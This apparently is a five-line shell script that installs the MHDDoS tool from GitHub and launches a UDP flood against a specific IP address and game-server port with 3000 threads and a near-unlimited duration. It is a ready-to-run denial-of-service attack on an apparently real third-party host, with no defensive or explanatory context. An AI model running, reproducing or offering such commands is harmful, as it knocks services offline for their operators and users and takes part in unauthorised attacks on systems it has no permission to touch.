apt update && apt install -y python3 python3-pip git build-essential
git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS
pip install -r requirements.txt --break-system-packages
python3 start.py UDP 40.160.20.9:16261 3000 99999999999
